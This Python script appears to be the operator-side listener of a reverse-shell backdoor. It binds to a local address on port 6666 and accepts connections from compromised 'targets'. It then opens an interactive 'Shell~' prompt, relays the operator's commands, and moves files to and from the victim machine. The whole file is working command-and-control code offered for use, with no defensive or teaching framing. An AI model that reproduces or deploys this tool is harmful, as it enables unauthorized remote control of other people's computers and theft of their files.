import time
import socket
import json
import os

def reliable_send(data, target):
    jsondata = json.dumps(data)
    try:
        target.send(jsondata.encode())
    except Exception as e:
        print("[!] Send error:", e)

def reliable_recv(target):
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name, target):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name, target):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout:
                break
        target.settimeout(None)

def target_communication(target, ip):
    while True:
        try:
            target.send(b'') # Connection control
            command = input('* Shell~%s: ' % str(ip))
        except EOFError:
            break
        except Exception as e:
            print('Error: ' + e)
            break

        reliable_send(command, target)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:], target)
        elif command[:6] == 'upload':
            upload_file(command[7:], target)
        else:
            try:
                result = reliable_recv(target)
                print(result)
                if result[:3] == '[!]': break
            except Exception as e:
                print("[!] Connection error:", e)
                break

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # IP ve portu kendi ortamınıza göre ayarlayın.
    sock.bind(('192.168.178.32', 6666))
    print('[+] Listening For The Incoming Connections')
    sock.listen(5)
    while True:
        try:
            target, ip = sock.accept()
            print('[+] Target Connected From: ' + str(ip))
            target_communication(target, ip)
            print("[*] Connection closed, waiting for new connection...")
        except Exception as e:
            print("Error:", e)

if __name__ == "__main__":
    main()
